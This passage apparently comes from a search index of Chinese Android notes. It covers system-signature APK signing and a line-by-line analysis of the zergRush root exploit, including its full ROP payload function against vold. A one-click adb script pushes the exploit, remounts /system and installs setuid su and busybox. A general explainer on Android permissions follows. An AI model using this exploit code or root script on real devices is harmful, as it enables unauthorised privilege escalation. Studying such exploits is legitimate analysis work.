\u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u6700\u6700\u540e\u8fd8\u8bf4\u4e0b\uff0c\u8fd9\u4e2aandroid:sharedUserId\u5c5e\u6027\u4e0d\u53ea\u53ef\u4ee5\u628aapk\u653e\u5230\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2aAPK\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u5171\u4eab\u6570\u636e\uff0c\u5e94\u8be5\u4f1a\u5f88\u6709\u7528\u7684\u3002 signapk\u7f16\u8bd1\u7ed3\u675f\u540e\u5728 android\u76ee\u5f55\u4e0b/out/host/linux-x86/framework/signapk.jar \u4f7f\u7528\u65b9\u6cd5\uff1ajava -jar signapk.jar platform.x509.pem platform.pk8 test.apk test_signed.apk\u6587\u4ef6\u3002 | \u6f0f\u6d1e \u2014 zergRush \u63d0\u6743\u5b9e\u73b0\u7684\u4ee3\u7801\uff0c\u89c1\uff1a https://github.com/revolutionary/zergRush/blob/master/zergRush.c \u9700\u8981\u4e86\u89e3\u4e00\u4e0b\u662f\u54ea\u4e2a\u5730\u65b9\u6709\u95ee\u9898\uff0c\u8fb9\u5206\u6790\u8fb9\u8bb0\u5f55\u6b64\u6b21\u8fc7\u7a0b\u3002 \u6587\u4ef6\u4e0d\u5927\uff0c\u5f53\u7136\u4ece main \u5165\u624b\u4e86\uff0c if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], \"boomsh\")) do_root(); \u660e\u663e\uff0c\u5f53\u6709\u4e86 Root \u80fd\u529b\u540e\u53bb\u505a\u4e00\u4e2a\u53ef\u4ee5\u4fdd\u6301 Root \u7684\u52a8\u4f5c\uff0c\u731c\u6d4b\uff0c\u6b64\u7a0b\u5e8f\u4f1a\u88ab\u8c03\u7528\u591a\u6b21\uff0c\u5e76\u4e14\u518d\u6b21\u8c03\u7528\u7684\u65f6\u5019\u7a0b\u5e8f\u540d\u79f0\u4e3a boomsh \u770b\u4e00\u4e0b do_root \u5427 \u5199\u4e86\u4e00\u4e2a\u5c5e\u6027 ro.kernel.qemu \u4e3a 1 \u660e\u663e\u662f\u8ba9\u624b\u673a\u5f53\u6210\u6a21\u62df\u5668\u8fd0\u884c\uff0c\u89c1 \\android2.32\\system\\core\\adb\\adb.c \u4e2d\u7684\u4ee3\u7801 1. /* run adbd in secure mode if ro.secure is set and 2. ** we are not in the emulator 3. */ 4. property_get(\"ro.kernel.qemu\", value, \"\"); 5. if (strcmp(value, \"1\") != 0) { 6. property_get(\"ro.secure\", value, \"\"); 7. if (strcmp(value, \"1\") == 0) { 8. // don't run as root if ro.secure is set... 9. secure = 1; 10. 11. // ... except we allow running as root in userdebug builds if the 12. // service.adb.root property has been set by the \"adb root\" command 13. property_get(\"ro.debuggable\", value, \"\"); 14. if (strcmp(value, \"1\") == 0) { 15. property_get(\"service.adb.root\", value, \"\"); 16. if (strcmp(value, \"1\") == 0) { 17. secure = 0; 18. } 19. } 20. } 21. } \u4ee5\u540e\u8c03\u7528 adb \u9ed8\u8ba4\u662f Root \u7528\u6237\u4e86\u3002 \u4e0b\u9762\u53c8\u505a\u4e86\u4e00\u4ef6\u4e8b\u628a\u81ea\u5df1\u62f7\u8d1d\u5230 /data/local/tmp/boomsh \u628a SH \u62f7\u8d1d\u5230 /data/local/tmp/sh \u6539\u53d8 /data/local/tmp/boomsh \u7684\u6743\u9650\u4e3a 711 \uff0c\u53ef\u6267\u884c\u4e86 \u7136\u540e\u83b7\u53d6 /system/bin/vold \u7a0b\u5e8f\u7684\u5927\u5c0f\uff0c \u901a\u8fc7 heap_addr = ((((st.st_size) + 0x8000) / 0x1000) + 1) * 0x1000; \u8fd9\u6837\u7684\u4e00\u4e2a\u8ba1\u7b97\uff0c\u5f97\u5230\u8be5\u7a0b\u5e8f\u7684\u5806\u5730\u5740\uff0c \u6709\u70b9\u610f\u601d\u4e86\uff0c\u5bf9 vold \u7a0b\u5e8f\u6709\u4e86\u6b6a\u8111\u7b4b\u4e86 \u7528\u8fc7\u5728\u624b\u673a\u4e0a\u7528 ps \u770b\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u6709\u662f\u4ece root \u7528\u6237\u6267\u884c\u8fc7\u6765\u7684\u3002 \u7136\u540e\u83b7\u53d6\u4e86\u4e00\u4e0b\u624b\u673a\u7684\u7248\u672c\u53f7\uff0c\u53ea\u5bf9 2.2 2.3 \u4e8c\u4e2a\u7248\u672c\u8fdb\u884c\u5904\u7406\uff0c\u5e76\u4fee\u6b63\u4e86\u4e00\u4e0a heap_addr \u7684\u5730\u5740\u3002 \u7136\u540e\u53c8\u627e\u4e86\u4e00\u4e0b system \u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u7684\u5730\u5740\uff0c\u653e\u5230 system_ptr \u4e2d \u7ee7\u7eed\u770b checkcrash() \u6e05\u9664\u4e86\u4e00\u4e0b logcat \u65e5\u5fd7 \u5220\u9664 /data/local/tmp/crashlog \u6587\u4ef6 \u7b80\u7acb\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53bb\u751f\u6210\u4e00\u4e0b crashlog \u6587\u4ef6\u3002 \u8c03\u7528 do_fault \u6253\u5f00 crashlog \u6587\u4ef6 \u5728 crashlog \u4e2d\u627e\u5230\u5d29\u6e83\u4fe1\u606f\uff0c\u627e\u5230 sp \u5bc4\u5b58\u5668\u5730\u5740\u3002 \u7b49\u7b49\uff0c\u4e3a\u4ec0\u4e48\u5d29\u6e83\u5462\uff0c\u80af\u5b9a\u662f\u5728 do_fault \u4e2d\u5236\u9020\u7684\uff0c\u6211\u4eec\u8981\u770b\u770b\u8fd9\u5757\u4e86 \u8fd9\u4e2a\u51fd\u6570\u6bd4\u8f83\u4e71\uff0c\u627e\u627e\u91cd\u70b9\u770b if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) \u4e0d\u9519\u7684\u4fe1\u606f\uff0c\u8fde\u63a5 vold \uff0c\u53c8\u662f\u5b83\uff0c\u4ee5\u524d\u542c\u8bf4\u8fc7\u5b83\u6709\u6f0f\u6d1e\uff0c\u8fd9\u6b21\u8fd8\u662f\u5b83\u3002 write(sock, buf, n+1) \u5199\u4e86\u4e00\u4e9b\u4fe1\u606f\uff0c\u4e0d\u77e5\u9053\u4ec0\u4e48\u4fe1\u606f\uff0c\u4f46\u662f\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u80fd\u8ba9 vold \u5d29\u6e83\u7684\u4fe1\u606f\u3002 \u4e0b\u9762\u56de\u5230 main \u7ee7\u7eed\uff01 \u4e00\u4e2a For \u5faa\u73af\u5904\u7406\u3002 find_stack_addr \u7528\u4e86\u4e0a\u9762\u7684\u76f8\u540c\u65b9\u6cd5\uff0c\u4ece\u5d29\u6e83\u4fe1\u606f\u4e2d\u627e\u5230\u7a0b\u5e8f\u7684\u6808\u5730\u5740\uff0c\uff08\u81f3\u4e8e\u600e\u4e48\u8ba1\u7b97\u7684\uff0c\u4ee5\u540e\u518d\u53bb\u7814\u7a76\u4e86\uff09 \u4e00\u4e9b\u5bb9\u9519\u68c0\u67e5\uff0c\u7565\u8fc7\uff01 kill(logcat_pid, SIGKILL); unlink(crashlog); find_rop_gadgets() \u53c8\u4e00\u4e2a\u964c\u751f\u51fd\u6570\u3002\u770b\u4e86\uff0c\u6682\u65f6\u770b\u4e0d\u51fa\u7528\u9014\uff0c\u8c8c\u4f3c\u627e\u70b9\u4ec0\u4e48\uff0c\u7ee7\u7eed\uff01 \u4e0b\u9762\u5c31\u662f\u518d\u6b21\u8c03\u7528 do_fault ,\u751f\u6210\u5d29\u6e83\u3002 \u518d\u6b21\u5224\u65ad sh \u662f\u5426\u6709\u6ca1\u6709 s \u4f4d\uff0c \u5982\u679c\u6709\u4e86\uff0c\u521a ROOT \u529f\u4e86\u3002 \u7591\u95ee\u6765\u4e86\uff0c\u6ca1\u53d1\u73b0\u600e\u4e48\u518d\u6b21\u8c03\u7528 boomsh \u8fd0\u884c\u6267\u884c do_root \u554a\u3002 \u987a\u7740\u5b83\u62f7\u8d1d\u51fa\u6765\u7684 sh \u6587\u4ef6\u627e\u627e\uff0c\u641c\u7d22 bsh \u53d8\u7406\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u5982\u4e0b\u5730\u65b9\uff1a 1. static **int** do_fault() 2. { 3. **char** buf[255]; 4. **int** sock = -1, n = 0, i; 5. **char** s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5]; 6. uint32_t bsh_addr; 7. **char** padding[128]; 8. int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz); 9. 10. memset(padding, 0, 128); 11. strcpy(padding, \"LORDZZZZzzzz\"); 12. if(padding_sz > 0) { 13. memset(padding+12, 'Z', padding_sz); 14. printf(\"[*] Poping %d more zerglings\\n\", padding_sz); 15. } 16. else if(padding_sz < 0) { 17. memset(padding, 0, 128); 18. memset(padding, 'Z', 12+padding_sz); 19. } 20. 21. if ((sock = socket_local_client(\"vold\", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) 22. die(\"[-] Error creating Nydus\"); 23. 24. sprintf(s_stack_addr, \"%c%c%c%c\", stack_addr & 0xff, (stack_addr>>8)&0xff, (stack_addr>>16)&0xff, (stack_addr>>24)&0xff); 25. sprintf(s_stack_pivot_addr, \"%c%c%c%c\", stack_pivot & 0xff, (stack_pivot>>8)&0xff, (stack_pivot>>16)&0xff, (stack_pivot>>24)&0xff); 26. sprintf(s_pop_r0_addr, \"%c%c%c%c\", pop_r0 & 0xff, (pop_r0>>8)&0xff, (pop_r0>>16)&0xff, (pop_r0>>24)&0xff); 27. sprintf(s_system, \"%c%c%c%c\", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff); 28. sprintf(s_heap_addr, \"%c%c%c%c\", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff); 29. 30. strcpy(buf, \"ZERG\"); 31. strcat(buf, \" ZZ \"); 32. strcat(buf, s_stack_pivot_addr); 33. for(i=3; i < buffsz+1; i++) 34. strcat(buf, \" ZZZZ\"); 35. strcat(buf, \" \"); 36. strcat(buf, s_heap_addr); 37. 38. n = strlen(buf); 39. bsh_addr = stack_addr + n + 1 + 8 + 8 + 8 + padding_sz + 12 + 4; 40. 41. if(check_addr(bsh_addr) == -1) { 42. printf(\"[-] Colossus, we're doomed!\\n\"); 43. exit(-1); 44. } 45. 46. sprintf(s_bsh_addr, \"%c%c%c%c\", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff); 47. 48. <strong><span style=\"color:#ffffff;BACKGROUND-COLOR: #ff0000\">n += sprintf(buf+n+1, \"%s%s OVER%s%s%s%sZZZZ%s%c\", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);</span></strong> 49. 50. printf(\"[*] Sending %d zerglings ...\\n\", n); 51. 52. if ((n = write(sock, buf, n+1)) < 0) 53. die(\"[-] Nydus seems broken\"); 54. 55. sleep(3); 56. close(sock); 57. 58. return n; 59. } \u770b\u5230\u4e0a\u9762\u52a0\u8272\u7684\u884c\u4e86\uff0c\u539f\u6765\u4ed6\u662f\u7528 socket \u5199\u7684\u4e00\u4e2a shell code \uff0c\u8c03\u7528\u4e86\u4ed6\u62f7\u8d1d\u7684 sh \u7a0b\u5e8f\u3002 \u5728 vold \u4e2d\u6267\u884c sh \u80af\u5b9a\u662f root \u554a\u3002 \u81f3\u6b64\uff0c\u539f\u7406\u5f88\u662f\u6e05\u695a\u4e86\uff0c shell code \u561b\uff0c\u8fd0\u884c\u7684\u65f6\u5019\u628a\u4ed6 dump \u51fa\u6765\u7528\u522b\u7684\u5de5\u5177\u770b\u5427\uff01 **\u4e00\u952eROOT\u811a\u672c** 1.\u7b49\u5f85\u8bbe\u5907\u8fde\u63a5 adb wait-for-device 2.\u5220\u9664\u6587\u4ef6 adb shell \"cd /data/local/tmp/; rm *\" 3.\u4e0a\u4f20zergRush\u5e76\u4fee\u6539\u5c5e\u6027\u53bb\u6267\u884c adb push c:\\zergRush /data/local/tmp/ adb shell \"chmod 777 /data/local/tmp/zergRush\" adb shell \"/data/local/tmp/zergRush\" adb wait-for-device 4.\u4e0a\u4f20busybox\u3001\u7ed9busybox\u6587\u4ef6\u6267\u884c\u6743\u9650\uff0c\u4ee5\u53ef\u4ee5\u65b9\u5f0f\u52a0\u8f7d\u6587\u4ef6\u7cfb\u7edf adb push c:\\busybox /data/local/tmp/ adb shell \"chmod 755 /data/local/tmp/busybox\" adb shell \"/data/local/tmp/busybox mount -o remount,rw /system\" 5.\u590d\u5236busybox\uff0c\u4fee\u6539\u6240\u5728\u7684\u7ec4\u53ca\u8bbe\u7f6es\u4f4d adb shell \"dd if=/data/local/tmp/busybox of=/system/xbin/busybox\" adb shell \"chown root.shell /system/xbin/busybox\" adb shell \"chmod 04755 /system/xbin/busybox\" 6.\u5b89\u88c5busybox\u5e76\u5220\u9664\u4e34\u65f6\u6587\u4ef6 adb shell \"/system/xbin/busybox --install -s /system/xbin\" adb shell \"rm -rf /data/local/tmp/busybox\" 7.\u5bf9su\u8fdb\u884c\u7c7b\u4f3cbusybox\u7684\u5904\u7406 adb push c:\\fu /system/bin/su adb shell \"chown root.shell /system/bin/su\" adb shell \"chmod 06755 /system/bin/su\" adb shell \"rm /system/xbin/su\" adb shell \"ln -s /system/bin/su /system/xbin/su\" 8.\u5b89\u88c5\u5176\u5b83\u5de5\u5177 adb push c:\\superuser.apk /system/app/ adb shell \"cd /data/local/tmp/; rm *\" adb reboot adb wait-for-device adb install c:\\recovery.apk \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/superkris/article/details/7709504","title":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidroot","text":"","title":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android","text":"Android\u7cfb\u7edf\u662f\u8fd0\u884c\u5728Linux\u5185\u6838\u4e0a\u7684\uff0cAndroid\u4e0eLinux\u5206\u522b\u6709\u81ea\u5df1\u7684\u4e00\u5957\u4e25\u683c\u7684\u5b89\u5168\u53ca\u6743\u9650\u673a\u5236\uff0c Android\u7cfb\u7edf\u6743\u9650\u76f8\u5173\u7684\u5185\u5bb9\uff0c \uff08\u4e00\uff09linux\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6743\u9650 -rwxr-x--x system system 4156 2012-06-30 16:12 test.apk. \u4ee3\u8868\u7684\u662f\u76f8\u5e94\u7684\u7528\u6237/\u7528\u6237\u7ec4\u53ca\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0e\u6b64\u6587\u4ef6\u8fd0\u884c\u8d77\u6765\u5177\u6709\u7684\u6743\u9650\u5b8c\u5168\u4e0d\u76f8\u5173\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bf4\u660esystem\u7528\u6237\u62e5\u6709\u5bf9\u6b64\u6587\u4ef6\u7684\u8bfb\u5199\u6267\u884c\u6743\u9650\uff1bsystem\u7ec4\u7684\u7528\u6237\u5bf9\u6b64\u6587\u4ef6\u62e5\u6709\u8bfb\u3001\u6267\u884c\u6743\u9650\uff1b\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u53ea\u5177\u6709\u6267\u884c\u6743\u9650\u3002\u800ctest.apk\u8fd0\u884c\u8d77\u6765\u540e\u53ef\u4ee5\u5e72\u54ea\u4e9b\u4e8b\u60c5\uff0c\u8ddf\u8fd9\u4e2a\u5c31\u4e0d\u76f8\u5173\u4e86\u3002 \u5343\u4e07\u4e0d\u8981\u770bapk\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5c5e\u4e8esystem/system\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u6216\u8005root/root\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u5c31\u8ba4\u4e3aapk\u5177\u6709system\u6216root\u6743\u9650\u3002apk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\u7684,\u5bf9\u5e94\u7684\u662fAndroid\u72ec\u7279\u7684\u6743\u9650\u673a\u5236\uff0c\u53ea\u6709\u4f53\u73b0\u5230\u6587\u4ef6\u7cfb\u7edf\u4e0a\u65f6\u624d\u4f7f\u7528linux\u7684\u6743\u9650\u8bbe\u7f6e\u3002 \uff08\u4e8c\uff09Android\u7684\u6743\u9650\u89c4\u5219 \uff081)Android\u4e2d\u7684apk\u5fc5\u987b\u7b7e\u540d \u8fd9\u79cd\u7b7e\u540d\u4e0d\u662f\u57fa\u4e8e\u6743\u5a01\u8bc1\u4e66\u7684\uff0c\u4e0d\u4f1a\u51b3\u5b9a\u67d0\u4e2a\u5e94\u7528\u5141\u4e0d\u5141\u8bb8\u5b89\u88c5\uff0c\u800c\u662f\u4e00\u79cd\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u91cd\u8981\u7684\u662f\uff0candroid\u7cfb\u7edf\u6709\u7684\u6743\u9650\u662f\u57fa\u4e8e\u7b7e\u540d\u7684\u3002\u6bd4\u5982\uff1asystem\u7b49\u7ea7\u7684\u6743\u9650\u6709\u4e13\u95e8\u5bf9\u5e94\u7684\u7b7e\u540d\uff0c\u7b7e\u540d\u4e0d\u5bf9\uff0c\u6743\u9650\u4e5f\u5c31\u83b7\u53d6\u4e0d\u5230\u3002 \u9ed8\u8ba4\u751f\u6210\u7684APK\u6587\u4ef6\u662fdebug\u7b7e\u540d\u7684\u3002\u83b7\u53d6system\u6743\u9650\u65f6\u7528\u5230\u7684\u7b7e\u540d\u89c1\u540e\u9762\u63cf\u8ff0 \uff082\uff09\u57fa\u4e8eUserID\u7684\u8fdb\u7a0b\u7ea7\u522b\u7684\u5b89\u5168\u673a\u5236 \u8fdb\u7a0b\u6709\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u4e0e\u8fdb\u7a0b\u95f4\u9ed8\u8ba4\u662f\u4e0d\u80fd\u4e92\u76f8\u8bbf\u95ee\u7684\uff0cAndroid\u901a\u8fc7\u4e3a\u6bcf\u4e00\u4e2aapk\u5206\u914d\u552f\u4e00\u7684linux userID\u6765\u5b9e\u73b0\uff0c\u540d\u79f0\u4e3a\"app_\"\u52a0\u4e00\u4e2a\u6570\u5b57\uff0c\u6bd4\u5982app_43\u4e0d\u540c\u7684UserID\uff0c\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5apk\u4e4b\u95f4\u9ed8\u8ba4\u4fbf\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u3002 Android\u63d0\u4f9b\u4e86\u5982\u4e0b\u7684\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u4f7f\u4e24\u4e2aapk\u6253\u7834\u524d\u9762\u8bb2\u7684\u8fd9\u79cd\u58c1\u5792\u3002 \u5728AndroidManifest.xml\u4e2d\u5229\u7528sharedUserId\u5c5e\u6027\u7ed9\u4e0d\u540c\u7684package\u5206\u914d\u76f8\u540c\u7684userID\uff0c\u901a\u8fc7\u8fd9\u6837\u505a\uff0c\u4e24\u4e2apackage\u53ef\u4ee5\u88ab\u5f53\u505a\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c \u7cfb\u7edf\u4f1a\u5206\u914d\u7ed9\u4e24\u4e2a\u7a0b\u5e8f\u76f8\u540c\u7684UserID\u3002\u5f53\u7136\uff0c\u57fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4e24\u4e2aapk\u9700\u8981\u76f8\u540c\u7684\u7b7e\u540d\uff0c\u5426\u5219\u6ca1\u6709\u9a8c\u8bc1\u4e5f\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\u3002 \uff083\uff09\u9ed8\u8ba4apk\u751f\u6210\u7684\u6570\u636e\u5bf9\u5916\u662f\u4e0d\u53ef\u89c1\u7684 \u5b9e\u73b0\u65b9\u6cd5\u662f\uff1aAndroid\u4f1a\u4e3a\u7a0b\u5e8f\u5b58\u50a8\u7684\u6570\u636e\u5206\u914d\u8be5\u7a0b\u5e8f\u7684UserID\u3002 \u501f\u52a9\u4e8eLinux\u4e25\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff0c\u4fbf\u5b9e\u73b0\u4e86apk\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u4f3c\u6709\u6570\u636e\u7684\u673a\u5236\u3002 \u4f8b\uff1a\u6211\u7684\u5e94\u7528\u521b\u5efa\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u9ed8\u8ba4\u6743\u9650\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709UserID\u4e3aapp_21\u7684\u7a0b\u5e8f\u624d\u80fd\u8bfb\u5199\u8be5\u6587\u4ef6\u3002 -rw------- app_21 app_21 87650 2000-01-01 09:48 test.txt \u5982\u4f55\u5bf9\u5916\u5f00\u653e\uff1f <1> \u4f7f\u7528MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE\u6807\u8bb0\u3002 When creating a new file with getSharedPreferences(String, int), openFileOutput(String, int), or openOrCreateDatabase(String, int, SQLiteDatabase.CursorFactory), you can use the MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE flags to allow any other package to read/write the file. When setting these flags, the file is still owned by your application, but its global read and/or write permissions have been set appropriately so any other application can see it. \uff084\uff09AndroidManifest.xml\u4e2d\u7684\u663e\u5f0f\u6743\u9650\u58f0\u660e Android\u9ed8\u8ba4\u5e94\u7528\u662f\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u53bb\u64cd\u4f5c\u5176\u4ed6\u5e94\u7528\u6216\u7cfb\u7edf\u76f8\u5173\u7279\u6027\u7684\uff0c\u5e94\u7528\u5728\u8fdb\u884c\u67d0\u4e9b\u64cd\u4f5c\u65f6\u90fd\u9700\u8981\u663e\u5f0f\u5730\u53bb\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u4ee5\u4e0b\u52a8\u4f5c\u65f6\u90fd\u9700\u8981\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\uff1a A particular permission may be enforced at a number of places during your program's operation: At the time of a call into the system, to prevent an application from executing certain functions.When starting an activity, to prevent applications from launching activities of other applications.Both sending and receiving broadcasts, to control who can receive your broadcast or who can send a broadcast to you.When accessing and operating on a content provider.Binding or starting a service. \u5728\u5e94\u7528\u5b89\u88c5\u7684\u65f6\u5019\uff0cpackage installer\u4f1a\u68c0\u6d4b\u8be5\u5e94\u7528\u8bf7\u6c42\u7684\u6743\u9650\uff0c\u6839\u636e\u8be5\u5e94\u7528\u7684\u7b7e\u540d\u6216\u8005\u63d0\u793a\u7528\u6237\u6765\u5206\u914d\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u662f\u4e0d\u68c0\u6d4b\u6743\u9650\u7684\u3002\u5982\u679c\u5b89\u88c5\u65f6\u6743\u9650\u83b7\u53d6\u5931\u8d25\uff0c\u90a3\u6267\u884c\u5c31\u4f1a\u51fa\u9519\uff0c\u4e0d\u4f1a\u63d0\u793a\u7528\u6237\u6743\u9650\u4e0d\u591f\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6743\u9650\u4e0d\u8db3\u5bfc\u81f4\u7684\u5931\u8d25\u4f1a\u5f15\u53d1\u4e00\u4e2a SecurityException\uff0c\u4f1a\u5728\u7cfb\u7edflog\uff08system log\uff09\u4e2d\u6709\u76f8\u5173\u8bb0\u5f55\u3002 \uff085\uff09\u6743\u9650\u7ee7\u627f/UserID\u7ee7\u627f \u5f53\u6211\u4eec\u9047\u5230apk\u6743\u9650\u4e0d\u8db3\u65f6\uff0c\u6211\u4eec\u6709\u65f6\u4f1a\u8003\u8651\u5199\u4e00\u4e2alinux\u7a0b\u5e8f\uff0c\u7136\u540e\u7531apk\u8c03\u7528\u5b83\u53bb\u5b8c\u6210\u67d0\u4e2a\u5b83\u6ca1\u6709\u6743\u9650\u5b8c\u6210\u7684\u4e8b\u60c5\uff0c\u5f88\u9057\u61be\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u884c\u4e0d\u901a\u7684\u3002 \u524d\u9762\u8bb2\u8fc7\uff0candroid\u6743\u9650\u662f\u5728\u8fdb\u7a0b\u5c42\u9762\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2aapk\u5e94\u7528\u542f\u52a8\u7684\u5b50\u8fdb\u7a0b\u7684\u6743\u9650\u4e0d\u53ef\u80fd\u8d85\u8d8a\u5176\u7236\u8fdb\u7a0b\u7684\u6743\u9650\uff08\u5373apk\u7684\u6743\u9650\uff09\uff0c \u5373\u4f7f\u5355\u72ec\u8fd0\u884c\u67d0\u4e2a\u5e94\u7528\u6709\u6743\u9650\u505a\u67d0\u4e8b\uff0c\u4f46\u5982\u679c\u5b83\u662f\u7531\u4e00\u4e2aapk\u8c03\u7528\u7684\uff0c\u90a3\u6743\u9650\u5c31\u4f1a\u88ab\u9650\u5236\u3002 \u5b9e\u9645\u4e0a\uff0candroid\u662f\u901a\u8fc7\u7ed9\u5b50\u8fdb\u7a0b\u5206\u914d\u7236\u8fdb\u7a0b\u7684UserID\u5b9e\u73b0\u8fd9\u4e00\u673a\u5236\u7684\u3002 \uff08\u4e09\uff09\u5e38\u89c1\u6743\u9650\u4e0d\u8db3\u95ee\u9898\u5206\u6790 \u9996\u5148\u8981\u77e5\u9053\uff0c\u666e\u901aapk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u975eroot\u3001\u975esystem\u5c42\u7ea7\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u770b\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u7684\u6743\u9650\u65f6\uff0c\u770b\u7684\u662f\u6700\u540e\u4e09\u4f4d\u3002 \u53e6\u5916\uff0c\u901a\u8fc7system/app\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u4e00\u822c\u6bd4\u76f4\u63a5\u5b89\u88c5\u6216adb install\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u8981\u9ad8\u4e00\u4e9b\u3002 \u8a00\u5f52\u6b63\u4f20\uff0c\u8fd0\u884c\u4e00\u4e2aandroid\u5e94\u7528\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u9047\u5230\u6743\u9650\u4e0d\u8db3\uff0c\u4e00\u822c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5: \uff081\uff09Log\u4e2d\u53ef\u660e\u663e\u770b\u5230\u6743\u9650\u4e0d\u8db3\u7684\u63d0\u793a\u3002 \u6b64\u79cd\u60c5\u51b5\u4e00\u822c\u662fAndroidManifest.xml\u4e2d\u7f3a\u5c11\u76f8\u5e94\u7684\u6743\u9650\u8bbe\u7f6e\uff0c\u597d\u597d\u67e5\u627e\u4e00\u756a\u6743\u9650\u5217\u8868\uff0c\u5e94\u8be5\u5c31\u53ef\u89e3\u51b3\uff0c\u662f\u6700\u6613\u5904\u7406\u7684\u60c5\u51b5\u3002 \u6709\u65f6\u6743\u9650\u90fd\u52a0\u4e0a\u4e86\uff0c\u4f46\u8fd8\u662f\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u662f\u4ec0\u4e48\u60c5\u51b5\u5462\uff1f 